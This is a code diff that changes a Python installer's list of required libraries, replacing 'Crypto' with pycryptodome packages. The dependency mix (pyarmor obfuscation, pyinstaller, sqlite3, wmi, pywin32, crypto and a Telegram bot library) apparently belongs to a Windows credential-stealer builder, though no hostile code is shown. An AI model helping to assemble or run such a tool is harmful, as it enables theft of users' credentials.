@@ -21,7 +21,7 @@ def download_libraries():
     required_libraries = [
         'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
         'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 'zipfile', 'python-telegram-bot',
-        'Crypto', 'datetime', "pywin32"
+        'pycryptodomex', 'pycryptodome','datetime', "pywin32"
     ]
 
     for library in required_libraries:
